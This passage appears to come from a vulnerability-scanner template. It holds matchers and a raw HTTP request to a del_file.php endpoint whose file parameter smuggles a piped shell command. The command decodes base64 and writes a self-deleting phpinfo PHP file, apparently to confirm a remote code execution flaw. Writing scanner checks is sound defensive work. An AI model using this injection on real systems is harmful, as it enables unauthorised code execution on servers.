        - part: body
          type: word
          words:
            - PHP Version
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php HTTP/1.1
